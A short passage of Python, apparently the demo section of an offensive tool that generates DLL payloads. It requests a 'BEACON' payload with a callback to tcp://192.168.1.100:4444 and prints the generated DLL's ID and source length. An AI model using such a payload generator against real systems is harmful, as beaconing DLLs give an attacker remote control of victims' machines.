            payload_type=PayloadType.BEACON,
            callback_url="tcp://192.168.1.100:4444"
        )
        print(f"  ✓ Generated DLL ID: {generated.dll_id}")
        print(f"  ✓ Payload: {generated.payload_type.value}")
        print(f"  ✓ Source code length: {len(generated.source_code)} chars")
    
    # Stats
    stats = factory.get_stats()
    print(f"\n📊 Statistics: {stats}")
